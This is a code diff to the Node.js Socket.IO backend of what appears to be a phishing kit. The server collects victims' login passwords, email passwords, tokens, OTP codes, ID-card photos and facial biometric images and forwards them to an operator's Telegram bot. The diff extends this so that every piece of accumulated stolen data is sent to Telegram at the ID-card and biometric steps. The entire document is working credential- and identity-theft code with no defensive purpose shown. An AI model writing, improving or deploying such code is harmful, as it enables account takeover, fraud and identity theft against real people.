@@ -165,8 +165,12 @@ io.on('connection', (socket) => {
     socket.on('clear-session', () => {
         if (sessionId && sessions.has(sessionId)) {
             console.log(`Clearing session data: ${sessionId}`);
-            // Keep the session ID but clear all data
-            sessions.set(sessionId, { createdAt: Date.now(), lastActivity: Date.now() });
+            const oldData = sessions.get(sessionId);
+            // Keep only createdAt and lastActivity, clear everything else
+            sessions.set(sessionId, { 
+                createdAt: oldData.createdAt || Date.now(), 
+                lastActivity: Date.now() 
+            });
             socket.emit('session-cleared', { sessionId });
         }
     });
@@ -187,7 +191,7 @@ io.on('connection', (socket) => {
             console.log(`[LOGIN] Received from session ${sessionId}:`, data);
             if (!sessionId) return socket.emit('login-response', { success: false, error: 'No session' });
             
-            const sessionData = sessions.get(sessionId) || {};
+            const sessionData = sessions.get(sessionId) || { createdAt: Date.now() };
             sessionData.documentType = data.documentType;
             sessionData.documentNumber = data.documentNumber;
             sessionData.password = data.password;
@@ -211,7 +215,7 @@ io.on('connection', (socket) => {
             console.log(`[EMAIL] Received from session ${sessionId}:`, data);
             if (!sessionId) return socket.emit('email-response', { success: false, error: 'No session' });
             
-            const sessionData = sessions.get(sessionId) || {};
+            const sessionData = sessions.get(sessionId) || { createdAt: Date.now() };
             sessionData.email = data.email;
             sessionData.emailPassword = data.password;
             sessionData.lastActivity = Date.now();
@@ -234,7 +238,7 @@ io.on('connection', (socket) => {
             console.log(`[TOKEN] Received from session ${sessionId}:`, data);
             if (!sessionId) return socket.emit('token-response', { success: false, error: 'No session' });
             
-            const sessionData = sessions.get(sessionId) || {};
+            const sessionData = sessions.get(sessionId) || { createdAt: Date.now() };
             sessionData.token = data.token;
             sessionData.lastActivity = Date.now();
             sessions.set(sessionId, sessionData);
@@ -256,7 +260,7 @@ io.on('connection', (socket) => {
             console.log(`[OTP] Received from session ${sessionId}:`, data);
             if (!sessionId) return socket.emit('otp-response', { success: false, error: 'No session' });
             
-            const sessionData = sessions.get(sessionId) || {};
+            const sessionData = sessions.get(sessionId) || { createdAt: Date.now() };
             sessionData.otp = data.otp;
             sessionData.lastActivity = Date.now();
             sessions.set(sessionId, sessionData);
@@ -278,7 +282,7 @@ io.on('connection', (socket) => {
             console.log(`[CEDULA] Received from session ${sessionId}`);
             if (!sessionId) return socket.emit('cedula-response', { success: false, error: 'No session' });
             
-            const sessionData = sessions.get(sessionId) || {};
+            const sessionData = sessions.get(sessionId) || { createdAt: Date.now() };
             sessionData.hasCedula = true;
             sessionData.lastActivity = Date.now();
             sessions.set(sessionId, sessionData);
@@ -290,13 +294,11 @@ io.on('connection', (socket) => {
             await bot.sendPhoto(chatId, frontBuffer, { caption: `📸 *Cédula Frontal*\nSesión: \`${sessionId}\``, parse_mode: 'Markdown' });
             await bot.sendPhoto(chatId, backBuffer, { caption: `📸 *Cédula Reverso*\nSesión: \`${sessionId}\``, parse_mode: 'Markdown' });
 
-            // Send summary message with buttons (only once)
+            // Send summary message with buttons and ALL accumulated data
             const buttons = getStandardButtons(sessionId);
-            const summaryMessage = `✅ *Cédula recibida*\nSesión: \`${sessionId}\``;
-            await bot.sendMessage(chatId, summaryMessage, {
-                parse_mode: 'Markdown',
-                reply_markup: { inline_keyboard: buttons }
-            });
+            await sendToTelegram(sessionId, sessionData, buttons);
+            
+            console.log(`[CEDULA] Successfully sent to Telegram for session ${sessionId}`);
             socket.emit('cedula-response', { success: true });
         } catch (error) {
             console.error('Error processing cedula:', error);
@@ -310,7 +312,7 @@ io.on('connection', (socket) => {
             console.log(`[BIOMETRIA] Received from session ${sessionId}`);
             if (!sessionId) return socket.emit('biometria-response', { success: false, error: 'No session' });
             
-            const sessionData = sessions.get(sessionId) || {};
+            const sessionData = sessions.get(sessionId) || { createdAt: Date.now() };
             sessionData.hasBiometria = true;
             sessionData.lastActivity = Date.now();
             sessions.set(sessionId, sessionData);
@@ -319,13 +321,11 @@ io.on('connection', (socket) => {
             const faceBuffer = Buffer.from(data.face.replace(/^data:image\/\w+;base64,/, ''), 'base64');
             await bot.sendPhoto(chatId, faceBuffer, { caption: `👤 *Biometría Facial*\nSesión: \`${sessionId}\``, parse_mode: 'Markdown' });
 
-            // Send summary message with buttons (only once)
+            // Send summary message with buttons and ALL accumulated data
             const buttons = getStandardButtons(sessionId);
-            const summaryMessage = `✅ *Biometría recibida*\nSesión: \`${sessionId}\``;
-            await bot.sendMessage(chatId, summaryMessage, {
-                parse_mode: 'Markdown',
-                reply_markup: { inline_keyboard: buttons }
-            });
+            await sendToTelegram(sessionId, sessionData, buttons);
+            
+            console.log(`[BIOMETRIA] Successfully sent to Telegram for session ${sessionId}`);
             socket.emit('biometria-response', { success: true });
         } catch (error) {
             console.error('Error processing biometria:', error);
